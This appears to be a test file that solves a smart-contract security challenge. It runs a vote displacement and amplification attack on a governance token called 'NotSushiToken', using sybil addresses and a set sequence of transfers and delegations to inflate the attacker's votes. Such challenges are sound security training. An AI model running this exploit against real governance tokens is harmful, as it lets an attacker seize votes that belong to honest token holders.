import { expect } from "chai";
import { Contract, Signer, BigNumber } from "ethers";
import { ethers } from "hardhat";

const BN = BigNumber;
let precision = BN.from(10).pow(18);

let accounts: Signer[];
let attacker: Signer; // WLed address 1
let o1: Signer; // WLed address 2
let o2: Signer; // WLed address 3
let admin: Signer; // should not be used
let adminUser: Signer; // WLed address 4 - should not be used
let governanceToken: Contract;

/// preliminary state
before(async () => {

  accounts = await ethers.getSigners();
  [attacker, o1, o2, admin, adminUser] = accounts;

  // setting up governance token:
  let governanceTokenFactory = await ethers.getContractFactory('NotSushiToken')
  governanceToken = await governanceTokenFactory.connect(admin).deploy()

  // attacker sybil attack - got 3 controlled addresses WLed
  await governanceToken.connect(admin).addWledAddresses([
    await adminUser.getAddress(),
    await attacker.getAddress(),
    await o1.getAddress(),
    await o2.getAddress()
  ])

  await governanceToken.connect(admin).mint(await adminUser.getAddress(),precision.mul(2_000))
  await governanceToken.connect(admin).mint(await attacker.getAddress(),precision.mul(500))

  // adminUser delegates all votes to himself
  await governanceToken.connect(adminUser).delegate(await adminUser.getAddress())

});

it("solves the challenge", async function () {

  let admnAddress = await adminUser.getAddress()
  let attAddress = await attacker.getAddress()
  let o1Address = await o1.getAddress()
  let o2Address = await o2.getAddress()

  // vote displacement + amplification attack
  await governanceToken.connect(attacker).transfer(o1Address,precision.mul(499))
  await governanceToken.connect(attacker).delegate(admnAddress)

  await governanceToken.connect(o1).transfer(attAddress,precision.mul(499))
  await governanceToken.connect(attacker).delegate(attAddress)

  await governanceToken.connect(attacker).transfer(o1Address,precision.mul(1))
  await governanceToken.connect(o1).delegate(admnAddress)

  await governanceToken.connect(attacker).transfer(o1Address,precision.mul(499))
  await governanceToken.connect(o1).delegate(attAddress)

  await governanceToken.connect(o1).transfer(o2Address,precision.mul(500))
  await governanceToken.connect(o2).delegate(attAddress)

});

/// expected final state
after(async () => {

  // attacker gets more delegated votes than adminUser
  let adminUserCount = await governanceToken.getCurrentVotes(await adminUser.getAddress())
  let attackerCount = await governanceToken.getCurrentVotes(await attacker.getAddress())
  expect(attackerCount).to.be.gt(adminUserCount)

});